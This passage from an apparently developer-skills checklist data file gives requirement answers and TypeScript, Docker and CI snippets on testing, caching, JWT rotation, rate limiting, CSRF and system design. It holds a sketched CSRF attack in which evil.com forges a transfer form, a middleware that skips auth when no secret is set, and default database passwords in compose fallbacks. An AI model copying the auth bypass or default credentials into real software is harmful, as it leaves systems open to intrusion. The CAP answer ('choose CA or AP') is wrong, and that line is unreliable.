            text: "Testing: service unit tests (mock repos), integration tests (supertest).",
            answer:
              "Unit test: mock the repository layer so tests are fast and don't need a DB. Integration test: spin up the real Express app with supertest against a real test database — tests the full stack from HTTP down to SQL.",
            code: `// Unit test — mock repository, no DB needed
import { vi } from 'vitest';
import * as todoRepo from '../repositories/todo.repository';
import { list } from '../services/todo.service';

vi.mock('../repositories/todo.repository');

test('list filters by userId', async () => {
  vi.mocked(todoRepo.listTodos).mockResolvedValue({
    rows: [{ id: 1, title: 'Buy milk', user_id: 42 }],
    total: 1,
  });
  const result = await list(42, { page: 1, limit: 20 });
  expect(todoRepo.listTodos).toHaveBeenCalledWith(expect.objectContaining({ userId: 42 }));
  expect(result.rows).toHaveLength(1);
});

// Integration test — real HTTP + real DB
import request from 'supertest';
import { buildApp } from '../app';

describe('GET /api/todos', () => {
  it('returns 401 without token', async () => {
    const app = await buildApp();
    await request(app).get('/api/todos').expect(401);
  });
  it('returns todos for authenticated user', async () => {
    const app = await buildApp();
    const token = await getTestToken(app); // login helper
    const res = await request(app)
      .get('/api/todos')
      .set('Authorization', 'Bearer ' + token)
      .expect(200);
    expect(Array.isArray(res.body.data)).toBe(true);
  });
});`,
            language: "ts",
          },
          {
            text: "Basic caching: Redis, cache invalidation on updates.",
            answer:
              "Cache-aside: check cache first, on miss query DB and write to cache with TTL. Invalidate the cache key whenever the data mutates. Never cache per-user data under a shared key. The hard problem: knowing when to invalidate.",
            code: `// Cache-aside pattern in GraphQL resolver
async function sensorReadings(sensorId: string) {
  const cacheKey = \`readings:\${sensorId}\`;

  // 1. Check cache
  const cached = await redis.get(cacheKey);
  if (cached) return JSON.parse(cached);

  // 2. Cache miss — query DB
  const rows = await pool.query(
    'SELECT * FROM readings WHERE sensor_id=$1 ORDER BY ts DESC LIMIT 60',
    [sensorId]
  );

  // 3. Write to cache with TTL
  await redis.set(cacheKey, JSON.stringify(rows.rows), 'EX', 30); // 30s TTL
  return rows.rows;
}

// Invalidate when new reading arrives
async function insertReading(sensorId: string, value: number) {
  await pool.query('INSERT INTO readings (sensor_id, value) VALUES ($1,$2)', [sensorId, value]);
  await redis.del(\`readings:\${sensorId}\`); // bust cache
}`,
            language: "ts",
          },
        ],
        keywords: [
          "cursor vs offset pagination",
          "composite index",
          "EXPLAIN ANALYZE",
          "N+1 query",
          "refresh token rotation",
          "supertest",
          "test database",
          "migration up/down",
          "Redis",
          "cache invalidation",
          "idempotency key",
        ],
        applicationNote:
          "be-node-express ACHIEVES: pagination/filtering/sorting, composite index verified via EXPLAIN, JWT refresh rotation + revocation, JOIN + aggregate queries (/api/todos/stats), and side-by-side session auth comparison.",
        projectRefs: [
          {
            project: "todo-app",
            label: "be-node-express/GUIDE.md",
            path: "be-node-express/GUIDE.md",
            note: "SQL section: composite index verified via EXPLAIN ANALYZE — read this section carefully",
          },
          {
            project: "todo-app",
            label: "be-node-express/src/services/auth.service.ts",
            path: "be-node-express/src/services/auth.service.ts",
            note: "JWT refresh rotation + reuse detection: second request with same token yields 401",
            language: "ts",
            codeSnippet: `// Rotation: presented token is verified, checked against DB
// (so a revoked/reused token is rejected even if JWT is still
// cryptographically valid), then immediately replaced.
export async function rotateRefreshToken(
  presentedToken: string
): Promise<TokenPair> {
  let payload;
  try {
    payload = verifyRefreshToken(presentedToken);
  } catch {
    throw new UnauthorizedError('Invalid or expired refresh token');
  }

  const tokenHash = hashToken(presentedToken);
  const stored = await refreshTokenRepo.findActiveRefreshToken(tokenHash);
  if (!stored) {
    // Token already used or revoked — possible replay attack.
    throw new UnauthorizedError('Refresh token has been revoked or reused');
  }

  const user = await userRepo.findUserById(payload.sub);
  if (!user) throw new UnauthorizedError('User no longer exists');

  await refreshTokenRepo.revokeRefreshToken(tokenHash);
  return issueTokenPair(user);  // issues fresh pair
}`,
          },
          {
            project: "foresight-2",
            label: "foresight-components/src/lib/batching/",
            path: "repo/foresight-components/src/lib/batching",
            note: "Real anti-N+1 batching: batchArray + calculateOptimalBatchSize + combineBatchResults — used by useBuildingsBatched",
            language: "ts",
            codeSnippet: `// src/lib/batching/batch-array.ts — split IDs into chunks
export function batchArray<T>(
  array: ReadonlyArray<T>,
  batchSize: number,
): ReadonlyArray<ReadonlyArray<T>> {
  if (batchSize <= 0) throw new Error("batchSize must be greater than 0");
  if (array.length === 0) return [];
  const batches: T[][] = [];
  for (let i = 0; i < array.length; i += batchSize) {
    batches.push(array.slice(i, i + batchSize));
  }
  return batches;
}

// src/lib/batching/calculate-optimal-batch-size.ts — tier table tuned for
// request count vs payload size trade-off. Default cap: 100 (smaller failure
// blast radius, lower timeout risk per request).
const DEFAULT_MAX_BATCH_SIZE = 100;
export function calculateOptimalBatchSize(
  totalItems: number,
  maxBatchSize = DEFAULT_MAX_BATCH_SIZE,
): number {
  if (totalItems <= 50)        return Math.min(25, maxBatchSize);
  if (totalItems <= 200)       return Math.min(50, maxBatchSize);
  if (totalItems <= 500)       return Math.min(100, maxBatchSize);
  if (totalItems <= 1000)      return Math.min(150, maxBatchSize);
  return Math.min(Math.ceil(totalItems / 10), maxBatchSize); // target ~10 reqs
}

// src/lib/batching/combine-batch-results.ts — pass to useQueries.combine
// IMPORTANT: pass this reference directly, never inline as arrow fn.
// Inlining breaks TanStack's combine memoization → re-runs every render.
export function combineBatchResults<T>(
  results: ReadonlyArray<UseQueryResult<ReadonlyArray<T> | null, Error>>,
): BatchedQueryResult<T> {
  const data: T[] = [];
  let isPending = false, isFetching = false;
  let succeeded = 0, failed = 0, pending = 0;
  for (const r of results) {
    if (r.isPending)  { isPending = true;  pending++; }
    if (r.isFetching)   isFetching = true;
    if (r.error)      { failed++; }
    if (r.isSuccess && r.data) { succeeded++; data.push(...r.data); }
  }
  return { data: data.length > 0 ? data : null, isPending, isFetching,
    isError: failed > 0, batchStatus: { total: results.length, succeeded, failed, pending } };
}

// Usage — useBuildingsBatched (foresight-cloud-bms)
export const useBuildingsBatched = ({ ids, batchSize, enabled = true }) => {
  const apolloClient = useApolloClient();
  const resolvedBatchSize = batchSize ?? calculateOptimalBatchSize(ids.length);
  const batches = batchArray(ids, resolvedBatchSize);

  return useQueries({
    queries: batches.map((batchIds) => ({
      ...buildingsQueryOptions(apolloClient, batchIds),
      enabled: enabled && batchIds.length > 0,
    })),
    combine: combineBatchResults<BuildingsEntity>,  // ← stable ref, not inline
  });
};`,
          },
          {
            project: "foresight-mini",
            label: "services/api/src/index.ts",
            path: "services/api/src",
            note: "GraphQL yoga + JWT auth + Redis cache + Prometheus metrics + /health — full observable API in ~130 lines",
            language: "ts",
            codeSnippet: `// foresight-mini/services/api/src/index.ts (key excerpts)

// Infrastructure
const pool = new pg.Pool({ connectionString: DATABASE_URL });
const redis = new Redis(REDIS_URL, {
  lazyConnect: true,
  maxRetriesPerRequest: 1,
  enableOfflineQueue: false,
});
// Non-fatal: fall through to Postgres if Redis unavailable
redis.on('error', (err) => logger.warn({ err }, 'Redis unavailable'));

// JWT auth middleware
function authenticate(req: IncomingMessage): boolean {
  if (!JWT_SECRET) return true;  // dev: skip auth when no secret set
  const token = req.headers['authorization']?.slice(7);
  try { jwt.verify(token, JWT_SECRET); return true; } catch { return false; }
}

// HTTP server with manual routing BEFORE GraphQL yoga
const server = createServer(async (req, res) => {
  const path = req.url?.split('?')[0];

  if (path === '/health') {         // Docker HEALTHCHECK
    await pool.query('SELECT 1');
    res.end(JSON.stringify({ status: 'ok', redis: redis.status }));
    return;
  }
  if (path === '/metrics') {        // Prometheus scrape endpoint
    res.end(await registry.metrics());
    return;
  }
  if (path === '/graphql' && !authenticate(req)) {
    res.writeHead(401);
    res.end(JSON.stringify({ errors: [{ message: 'Unauthorized' }] }));
    return;
  }
  return yoga.handle(req, res);     // delegate to GraphQL
});`,
          },
        ],
        gaps: [
          "No tests (npm test does not exist) — largest single gap.",
          "Uses init.sql run once via Docker entrypoint, not versioned migrations.",
          "No caching layer (Redis) — /api/todos/stats is prime candidate.",
          "No API versioning prefix (/api/v1).",
        ],
      },
      {
        name: "DevOps",
        status: "partial",
        requirements: [
          {
            text: "Multi-stage Docker builds to reduce final image size.",
            answer:
              "Stage 1 (builder): install all deps including devDeps, run tsc. Stage 2 (runtime): fresh base, production deps only, copy compiled dist/. The final image has no TypeScript compiler, no source .ts files, no devDependencies — smaller attack surface, smaller image size.",
            code: `# Stage 1: compile TypeScript
FROM node:18-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm install           # includes devDeps for tsc
COPY . .
RUN npm run build         # tsc → dist/

# Stage 2: lean runtime (no devDeps, no .ts files)
FROM node:18-alpine
WORKDIR /app
COPY package*.json ./
RUN npm install --only=production  # ~50% smaller node_modules
COPY --from=builder /app/dist ./dist
EXPOSE 5001
# HEALTHCHECK consumed by docker-compose + orchestrators:
HEALTHCHECK --interval=10s --timeout=5s --start-period=15s --retries=3 \\
  CMD wget -qO- http://localhost:5001/health || exit 1
CMD ["node", "dist/index.js"]`,
            language: "dockerfile",
          },
          {
            text: "Realistic CI pipeline: lint + type-check + tests, with dependency caching.",
            answer:
              "actions/cache stores node_modules between runs keyed by OS + lockfile hash. If the lockfile didn't change, npm install is skipped entirely. Run lint, tsc --noEmit, and tests as separate steps so failures are isolated.",
            code: `name: CI
on: [push, pull_request]
jobs:
  validate:
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: be-node-express
    steps:
      - uses: actions/checkout@v4

      - uses: actions/cache@v3
        with:
          path: ~/.npm
          # Cache busts only when lockfile changes
          key: \${{ runner.os }}-node-\${{ hashFiles('**/package-lock.json') }}

      - uses: actions/setup-node@v4
        with: { node-version: 18 }

      - run: npm ci              # faster than npm install, uses lockfile
      - run: npm run lint        # ESLint
      - run: npx tsc --noEmit   # type-check without emitting files
      - run: npm test            # Vitest/Jest`,
            language: "yaml",
          },
          {
            text: "Health check endpoints and HEALTHCHECK in Dockerfile.",
            answer:
              "Container orchestrators (Docker, Kubernetes) probe the /health endpoint to decide if a container is ready to receive traffic. Without HEALTHCHECK, docker-compose reports 'Up' even if the app crashed at startup.",
            code: `// src/app.ts — the /health endpoint
app.get('/health', (_req, res) =>
  res.json({ status: 'ok', uptime: process.uptime() })
);

# Dockerfile — consumed by docker & K8s liveness probes
HEALTHCHECK --interval=10s --timeout=5s --start-period=15s --retries=3 \\
  CMD wget -qO- http://localhost:5001/health || exit 1

# docker-compose — use healthcheck for real readiness
depends_on:
  be-node-express:
    condition: service_healthy  # waits for /health to return 200`,
            language: "bash",
          },
          {
            text: "Hands-on Action Case: Stress Testing & Fault-tolerant Cache Fallback Simulation.",
            answer:
              "Executing autocannon load tests against GraphQL API in foresight-mini, stopping Redis container mid-stream (docker stop foresight-redis) to verify graceful fallback to PostgreSQL, and monitoring metrics via Prometheus/Grafana.",
            code: `# Load testing with autocannon
npx autocannon -c 50 -d 10s -m POST \\
  -H "Content-Type: application/json" \\
  -b '{"query":"query { readings(sensorId: \\"sensor-001\\") { id val timestamp } }"}' \\
  http://localhost:4000/graphql

# Fault injection: Kill Redis
docker stop foresight-redis
# App handles fallback to Postgres without 500 error`,
            language: "bash",
          },
        ],
        keywords: [
          "multi-stage build",
          "Docker layer caching",
          "CI cache (actions/cache)",
          "HEALTHCHECK",
          "environment parity",
          "container registry",
        ],
        applicationNote:
          "be-node-express/Dockerfile is already multi-stage (builder stage separated from runtime stage, npm install --only=production in the final stage) — explaining why the final stage does not require TypeScript or devDependencies meets requirements.",
        projectRefs: [
          {
            project: "todo-app",
            label: "be-node-express/Dockerfile",
            path: "be-node-express/Dockerfile",
            note: "Multi-stage: builder → runtime, devDependencies excluded from final image",
            language: "dockerfile",
            codeSnippet: `FROM node:18-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm install          # installs devDependencies for tsc
COPY . .
RUN npm run build        # tsc → dist/

FROM node:18-alpine      # clean runtime stage
WORKDIR /app
COPY package*.json ./
RUN npm install --only=production  # no devDeps, no TypeScript
COPY --from=builder /app/dist ./dist
EXPOSE 5001
HEALTHCHECK --interval=10s --timeout=5s --start-period=15s --retries=3 \\
  CMD wget -qO- http://localhost:5001/health || exit 1
CMD ["node", "dist/index.js"]`,
          },
          {
            project: "todo-app",
            label: "docker-compose.prod.yml",
            path: "docker-compose.prod.yml",
            note: "${VAR:?...} syntax fails fast on missing production secrets — never starts with empty JWT_ACCESS_SECRET",
            language: "yaml",
            codeSnippet: `# docker-compose.prod.yml — production deployment
services:
  be-node-express:
    image: todo-be-express:latest
    restart: unless-stopped
    environment:
      NODE_ENV: production
      PORT: 5001
      # :? syntax = fail-fast: docker compose up errors immediately
      # if this var is unset or empty. Never starts with empty secret.
      JWT_ACCESS_SECRET:  \${JWT_ACCESS_SECRET:?JWT_ACCESS_SECRET must be set}
      JWT_REFRESH_SECRET: \${JWT_REFRESH_SECRET:?JWT_REFRESH_SECRET must be set}
      SESSION_SECRET:     \${SESSION_SECRET:?SESSION_SECRET must be set}
      DATABASE_URL:       \${DATABASE_URL:-postgresql://postgres:pass@db:5432/todo_db}
    depends_on: [db]
    networks: [todo-network]

  db:
    image: postgres:15-alpine
    restart: unless-stopped
    environment:
      POSTGRES_PASSWORD: \${POSTGRES_PASSWORD:-postgres_secure_pass}
    volumes:
      - pgdata_prod:/var/lib/postgresql/data  # named volume = data persists

volumes:
  pgdata_prod:   # survives docker compose down`,
          },
          {
            project: "foresight-mini",
            label: "services/*/Dockerfile",
            path: "services",
            note: "Each microservice has its own multi-stage Dockerfile — compare adapter (simple) vs api (HEALTHCHECK curl)",
            language: "dockerfile",
            codeSnippet: `# services/adapter/Dockerfile — simple 2-stage pattern
FROM node:22-alpine AS builder
WORKDIR /app
COPY package.json package-lock.json* ./
RUN npm ci                           # installs devDeps for build
COPY src ./src

FROM node:22-alpine
WORKDIR /app
COPY package.json package-lock.json* ./
RUN npm ci --omit=dev                # production deps only in final image
COPY --from=builder /app/src ./src
CMD ["npm", "start"]

# ---
# services/api/Dockerfile — adds HEALTHCHECK (consumed by docker-compose depends_on)
FROM node:22-alpine AS builder
WORKDIR /app
COPY package.json package-lock.json* ./
RUN npm ci
COPY src ./src

FROM node:22-alpine
WORKDIR /app
COPY package.json package-lock.json* ./
RUN npm ci --omit=dev
COPY --from=builder /app/src ./src
EXPOSE 4000
HEALTHCHECK --interval=10s --timeout=5s --start-period=20s --retries=3 \\
  CMD wget -qO- http://localhost:4000/health || exit 1
CMD ["npm", "start"]`,
          },
        ],
        gaps: [
          "CI only runs npm install && npm run build — does NOT run linters or tests.",
          "No node_modules caching between CI runs (actions/cache).",
          "Dockerfile lacks HEALTHCHECK directive despite /health endpoint existing in src/app.ts.",
        ],
      },
      {
        name: "Security",
        status: "met",
        requirements: [
          {
            text: "JWT best practices: short-lived access tokens, refresh token rotation + reuse detection.",
            answer:
              "Access tokens: 15 min expiry, stored in memory (not localStorage). Refresh tokens: 7 days, httpOnly cookie. Rotation: each refresh consumes the old token and issues a new one. Reuse detection: if a consumed token is presented again, revoke the entire token family — an attacker had the token.",
            code: `// Rotation sequence:
// Client uses R1 → Server revokes R1, issues R2+A2
// Client uses R2 → Server revokes R2, issues R3+A3
// [Attacker re-uses R1] → R1 not in DB (already revoked)
//   → REUSE DETECTED: revoke R2, R3 (entire family)
//   → User forced to re-login

export async function rotateRefreshToken(presented: string) {
  const payload = verifyRefreshToken(presented); // throws if expired

  const stored = await refreshTokenRepo.findActive(hashToken(presented));
  if (!stored) {
    // Token was already used — possible replay attack
    await refreshTokenRepo.revokeFamily(payload.sub); // evict all
    throw new UnauthorizedError('Reuse detected — re-login required');
  }

  await refreshTokenRepo.revoke(hashToken(presented));
  return issueTokenPair(await userRepo.findById(payload.sub));
}`,
            language: "ts",
          },
          {
            text: "Rate limiting on sensitive endpoints to prevent brute-force.",
            answer:
              "A rate limiter tracks request count per IP per time window. Without it, an attacker can try millions of password/OTP guesses. Apply only to auth endpoints — adding it globally slows legitimate API traffic.",
            code: `import rateLimit from 'express-rate-limit';

export const authRateLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15-minute window
  limit: 20,                 // max 20 attempts per IP per window
  standardHeaders: true,     // RateLimit-* response headers
  legacyHeaders: false,
  message: { error: 'Too many auth attempts, please try again later' },
});

// Apply only to auth routes, not all routes:
app.use('/api/auth', authRateLimiter, authRoutes);

// Without rate limiting:
// 1000 guesses/sec × 86400 sec/day = 86.4M guesses/day
// With rate limiting:
// 20 guesses / 15 min = 1920 guesses/day — brute-force infeasible`,
            language: "ts",
          },
          {
            text: "OWASP Top 10: understanding and applying the most critical web vulnerabilities.",
            answer:
              "The 10 most exploited vuln classes. Most critical for a Node/React app: A01 Broken Access Control (verify ownership on every request), A02 Cryptographic Failures (bcrypt, HTTPS, no plaintext), A03 Injection (parameterized SQL), A07 Auth Failures (rate limit, rotate tokens), A09 Logging Failures (structured logs with request IDs).",
            code: `// A01 Broken Access Control — always verify ownership
router.get('/:id', asyncHandler(async (req, res) => {
  const todo = await todoService.getById(req.params.id);
  // ❌ Never just check it exists:
  // if (!todo) return res.status(404).json({});

  // ✅ Also verify the requesting user OWNS it:
  if (todo.userId !== req.user!.id) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  res.json(todo);
}));

// A03 Injection — already covered: parameterized queries + whitelist
// A07 Auth Failures — covered: rate limiting + token rotation
// A09 Logging Failures — structured logs with request ID:
app.use((req, _res, next) => {
  req.id = crypto.randomUUID();
  logger.info({ reqId: req.id, method: req.method, path: req.path });
  next();
});`,
            language: "ts",
          },
          {
            text: "CSRF and why session auth needs it more than JWT in headers.",
            answer:
              "CSRF: a malicious site tricks the browser into making a cross-origin request to your API. Browsers auto-attach cookies — so session auth is vulnerable. JWTs in Authorization headers are NOT auto-attached by browsers — so they're CSRF-immune. Mitigation: SameSite=Lax (blocks cross-site POSTs), or Double Submit Cookie.",
            code: `// CSRF attack flow (session auth):
// 1. User logged into bank.com (session cookie auto-sent)
// 2. User visits evil.com
// 3. evil.com renders: <form action="bank.com/transfer" method="POST">
// 4. Browser auto-sends session cookie with the request!
// 5. Bank processes the transfer as the legitimate user

// Mitigation 1: SameSite cookie (prevents auto-send on cross-site)
app.use(session({
  cookie: {
    sameSite: 'lax',   // blocks cross-site POST (form submit)
    // 'strict' also blocks top-level navigation (too aggressive for most apps)
    httpOnly: true,    // JS can't read the cookie
    secure: true,      // HTTPS only
  }
}));

// JWT in Authorization header — CSRF immune:
// Browser NEVER auto-attaches headers — JS must explicitly set them.
// evil.com can't read your token (cross-origin restrictions).`,
            language: "ts",
          },
        ],
        keywords: [
          "refresh token rotation",
          "replay attack",
          "rate limiting",
          "OWASP Top 10",
          "npm audit",
          "Dependabot",
          "CSRF",
          "SameSite cookie",
        ],
        applicationNote:
          "src/services/auth.service.ts implements refresh token rotation + reuse detection. src/middleware/rateLimiter.ts enforces 20 requests per 15 minutes for /api/auth/*.",
        projectRefs: [
          {
            project: "todo-app",
            label: "be-node-express/src/middleware/rateLimiter.ts",
            path: "be-node-express/src/middleware/rateLimiter.ts",
            note: "20 req/15 min on /api/auth/* — brute-force protection",
            language: "ts",
            codeSnippet: `import rateLimit from 'express-rate-limit';

// Throttles brute-force credential guessing
// against login/register endpoints.
export const authRateLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  limit: 20,
  standardHeaders: true,
  legacyHeaders: false,
  message: {
    error: 'Too many auth attempts, please try again later'
  },
});`,
          },
          {
            project: "foresight-2",
            label: ".npmrc supply-chain defense",
            path: "repo/foresight-cloud-bms/.npmrc",
            note: "4 defense layers: min-release-age=7, ignore-scripts=true, no hardcoded secrets, private registry auth",
            language: "bash",
            codeSnippet: `# foresight-cloud-bms/.npmrc — 4-layer supply-chain defense

# Layer 1: Block packages published in last 7 days.
# Malware is typically yanked within 24-72h of discovery.
# Requires npm >=11.5.0
min-release-age=7

# Layer 2: Fail on engines mismatch (pairs with .nvmrc + package.json engines)
engine-strict=true

# Layer 3: Block ALL install-lifecycle scripts (pre/post/install) for
# every package including transitive deps.
# Postinstall is the most common malware payload vector.
# Consequence: husky hooks don't auto-install — run \`npm run prepare\` once.
ignore-scripts=true

# Layer 4: Private registry for @piscada/* packages
# Credentials from env vars — never committed
@piscada:registry=https://nexus.piscada.tools/repository/npm-group/
//nexus.piscada.tools/repository/npm-group/:username=\${NEXUS_USERNAME}
//nexus.piscada.tools/repository/npm-group/:_password=\${NEXUS_PASSWORD_BASE64}`,
          },
        ],
        gaps: [
          "npm audit reports 3 transitive vulnerabilities (@apollo/server, brace-expansion, uuid).",
          "Lacks Dependabot/Renovate configuration.",
          "Session cookies use sameSite: lax without explaining why strict was not chosen.",
        ],
      },
    ],
  },
  {
    id: 4,
    slug: "senior",
    title: "Level 4",
    subtitle: "Senior",
    experience: "3 – 6 years",
    overallStatus: "🟠 Partially Met",
    statusColor: "orange",
    selfCheck:
      "You can design a system for 10M users with tradeoff discussions documented in an ADR, explain the CAP theorem with a real example from your codebase, write a postmortem for a production incident with an RCA and action items, choose between JWT and session auth for a given set of requirements justifying your decision, and describe how GitOps differs from traditional CI/CD push deployments.",
    domains: [
      {
        name: "Frontend",
        status: "not-met",
        requirements: [
          {
            text: "Real-time UI: WebSockets/SSE — bi-directional updates without polling.",
            answer:
              "Polling: re-fetches on a timer — wastes bandwidth, delayed updates. SSE: server pushes events over a persistent HTTP connection (one-way, perfect for dashboards). WebSocket: full-duplex — server and client both push (use for chat, collaborative editing).",
            code: `// SSE — server pushes to client (one-way)
// Server (Express):
app.get('/events', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  const id = setInterval(() => {
    res.write('data: ' + JSON.stringify({ ts: Date.now() }) + '\\n\\n');
  }, 1000);
  req.on('close', () => clearInterval(id));
});

// Client (React):
useEffect(() => {
  const es = new EventSource('/events');
  es.onmessage = (e) => setData(JSON.parse(e.data));
  return () => es.close();
}, []);

// WebSocket — full duplex (use for chat/collaboration)
const ws = new WebSocket('wss://api.example.com/ws');
ws.onmessage = (e) => dispatch({ type: 'MESSAGE', payload: JSON.parse(e.data) });
ws.send(JSON.stringify({ type: 'SUBSCRIBE', channel: 'todos' }));`,
            language: "tsx",
          },
          {
            text: "Advanced performance: virtualization for large lists, Web Workers.",
            answer:
              "Rendering 10,000 DOM nodes is slow. Virtualization renders only the visible window (~20 items) and recycles DOM nodes on scroll. Web Workers offload heavy computation off the main thread so the UI stays at 60fps.",
            code: `// List virtualization with @tanstack/react-virtual
import { useVirtualizer } from '@tanstack/react-virtual';

function VirtualTodoList({ todos }: { todos: Todo[] }) {
  const parentRef = useRef<HTMLDivElement>(null);
  const virtualizer = useVirtualizer({
    count: todos.length,
    getScrollElement: () => parentRef.current,
    estimateSize: () => 48,   // estimated row height in px
  });

  return (
    <div ref={parentRef} style={{ height: '600px', overflow: 'auto' }}>
      <div style={{ height: virtualizer.getTotalSize() }}>
        {virtualizer.getVirtualItems().map(item => (
          <div key={item.key} style={{ transform: \`translateY(\${item.start}px)\` }}>
            {todos[item.index].title}  {/* only ~15 items rendered */}
          </div>
        ))}
      </div>
    </div>
  );
}

// Web Worker — heavy CSV parsing off main thread
const worker = new Worker(new URL('./csv.worker.ts', import.meta.url));
worker.postMessage({ csv: rawCsvString });
worker.onmessage = (e) => setParsedData(e.data);`,
            language: "tsx",
          },
          {
            text: "Accessibility (WCAG 2.1 AA): ARIA, keyboard navigation.",
            answer:
              "Accessibility is not optional — it's a legal requirement in many jurisdictions. Screen readers navigate by headings and landmarks. Interactive elements must be keyboard-focusable. ARIA attributes supplement HTML semantics when native elements aren't sufficient.",
            code: `{/* ❌ Inaccessible: div with click handler, no keyboard, no role */}
<div onClick={handleDelete} style={{ cursor: 'pointer' }}>
  Delete
</div>

{/* ✅ Accessible: native button (keyboard, screen reader, focus) */}
<button
  onClick={handleDelete}
  aria-label={\`Delete todo: \${todo.title}\`}  // screen reader context
>
  ✕
</button>

{/* Modal: focus trap + aria roles */}
<div
  role="dialog"
  aria-modal="true"
  aria-labelledby="dialog-title"
>
  <h2 id="dialog-title">Confirm Delete</h2>
  <button autoFocus>Cancel</button>  {/* focus on open */}
  <button onClick={confirmDelete}>Delete</button>
</div>

{/* Skip link for keyboard users */}
<a href="#main-content" className="sr-only focus:not-sr-only">
  Skip to main content
</a>`,
            language: "tsx",
          },
        ],
        keywords: [
          "module federation",
          "WCAG 2.1",
          "ARIA",
          "WebSocket",
          "SSE",
          "Web Worker",
          "virtualization",
          "XState",
          "design system",
          "Storybook",
        ],
        applicationNote:
          "todo-app frontends do not yet demonstrate Senior FE capabilities. The foresight-2 codebase is the reference for this level.",
        projectRefs: [
          {
            project: "foresight-mini",
            label: "frontend/src/Sparkline.tsx",
            path: "frontend/src/Sparkline.tsx",
            note: "Derived state via pure computation (no useState) — maps sensor readings to SVG polyline points",
            language: "tsx",
            codeSnippet: `// foresight-mini/frontend/src/Sparkline.tsx
export function Sparkline({ readings }: { readings: Reading[] }) {
  if (readings.length === 0) return <div className="sparkline-empty">no data yet</div>;

  const values = readings.map((r) => r.value);
  const min = Math.min(...values);
  const max = Math.max(...values);
  const range = max - min || 1;  // prevent division by zero

  const width = 240, height = 60;
  const step = width / Math.max(values.length - 1, 1);

  // Map each value to (x, y) in SVG coordinate space.
  // y is inverted: SVG 0 = top, so higher values = smaller y.
  const points = values
    .map((v, i) => {
      const x = i * step;
      const y = height - ((v - min) / range) * height;
      return \`\${x.toFixed(1)},\${y.toFixed(1)}\`;
    })
    .join(" ");

  const latest = values[values.length - 1];

  return (
    <div className="sparkline">
      <svg width={width} height={height}>
        <polyline points={points} fill="none" stroke="currentColor" strokeWidth="2" />
      </svg>
      <span className="sparkline-value">{latest}</span>
    </div>
  );
}`,
          },
          {
            project: "foresight-2",
            label: "foresight-cloud-bms (design system, SSR)",
            path: "repo/foresight-cloud-bms",
            note: "TanStack Start SSR + @piscada/foresight-components design system — Senior FE reference",
          },
        ],
        gaps: [
          "No WebSocket/SSE real-time updates (only polling).",
          "No accessibility implementation.",
          "No virtualization for large lists.",
        ],
      },
      {
        name: "Backend",
        status: "partial",
        requirements: [
          {
            text: "System design: horizontal scaling, load balancing, CAP theorem.",
            answer:
              "CAP: a distributed system can guarantee at most 2 of: Consistency (every read gets the latest write), Availability (every request gets a response), Partition tolerance (works despite network splits). In practice P is unavoidable — you choose CA or AP. Horizontal scaling: add more instances behind a load balancer; requires stateless app servers (session in Redis, not in-process).",
            code: `// CAP tradeoff example — foresight-bgs replication:
// If replication to graph-service fails, the entire mutation fails.
// Choice: Consistency over Availability for writes.
// (Graph must stay in sync with BGS — data drift is worse than downtime)

// For horizontal scaling: stateless Express app
// Sessions must be in Redis (shared store), not in-process memory:
import RedisStore from 'connect-redis';
app.use(session({
  store: new RedisStore({ client: redis }),
  // Each app instance reads/writes session from shared Redis
  // → any instance can handle any request
}));

// Load balancer routes requests round-robin:
// [Client] → [Nginx / ALB]
//               ├───> [App Instance 1] → [Redis] + [Postgres Primary]
//               ├───> [App Instance 2] → [Redis] + [Postgres Replica]
//               └───> [App Instance 3] → [Redis] + [Postgres Replica]`,
            language: "ts",
          },
          {
            text: "Message queues / event-driven architecture: queues vs synchronous RPC.",
            answer:
              "Synchronous RPC: caller waits for response — simple but couples availability (if downstream is down, caller fails). Queue: caller publishes message and continues — decouples producers from consumers, enables retry, backpressure, and fan-out. At-least-once: message may be delivered multiple times — consumers must be idempotent.",
            code: `// Synchronous RPC — tight coupling
// If email service is down → entire registration fails
async function register(email, password) {
  const user = await createUser(email, password);
  await emailService.sendWelcome(email); // ❌ blocks + coupled
  return user;
}

// Event-driven with NATS — decoupled
async function register(email, password) {
  const user = await createUser(email, password);
  // Publish and move on — email service processes asynchronously
  nc.publish('user.registered', sc.encode(JSON.stringify({ email })));
  return user; // ✅ returns immediately, email sent eventually
}

// NATS subscriber (email service) — idempotent consumer
nc.subscribe('user.registered', {
  callback: async (err, msg) => {
    const { email } = JSON.parse(sc.decode(msg.data));
    // Safe to re-process if re-delivered:
    await emailService.sendWelcomeIfNotSent(email);
  },
});`,
            language: "ts",
          },
          {
            text: "GraphQL: schema design, resolvers, N+1 with DataLoader, subscriptions.",
            answer:
              "GraphQL N+1: each item in a list triggers a separate resolver call — 100 todos = 100 category queries. DataLoader batches and deduplicates: collects all categoryIds from the current tick, fires ONE query, distributes results. Federation: multiple services own parts of the schema, composed at the gateway.",
            code: `import DataLoader from 'dataloader';

// Without DataLoader: N+1
// resolver for Todo.category:
const category = async (todo) =>
  db.query('SELECT * FROM categories WHERE id=$1', [todo.categoryId]);
// 100 todos → 100 separate DB queries!

// With DataLoader: batched
const categoryLoader = new DataLoader(async (ids: number[]) => {
  const rows = await db.query(
    'SELECT * FROM categories WHERE id = ANY($1)',
    [ids]           // single query for all IDs
  );
  // Must return results in same order as input ids:
  return ids.map(id => rows.find(r => r.id === id) ?? null);
});

// Resolver now uses loader:
const category = (todo) => categoryLoader.load(todo.categoryId);
// 100 todos → 1 batched DB query (DataLoader collects all IDs per tick)`,
            language: "ts",
          },
          {
            text: "Observability: structured logging, distributed tracing, metrics.",
            answer:
              "The three pillars: Logs (what happened), Metrics (how many/how fast), Traces (which path through services). Structured JSON logs enable search. Request IDs correlate logs across services. Prometheus scrapes metrics endpoints. Jaeger traces requests across microservices.",
            code: `import pino from 'pino';

// Structured JSON logging — searchable, not just readable
const logger = pino({
  level: 'info',
  transport: process.env.NODE_ENV === 'development'
    ? { target: 'pino-pretty' }  // human-readable in dev
    : undefined,                  // JSON in production
});

// Request ID middleware — correlate logs across a single request
app.use((req, _res, next) => {
  req.id = req.headers['x-request-id'] ?? crypto.randomUUID();
  req.log = logger.child({ reqId: req.id, path: req.path });
  next();
});

// In a handler:
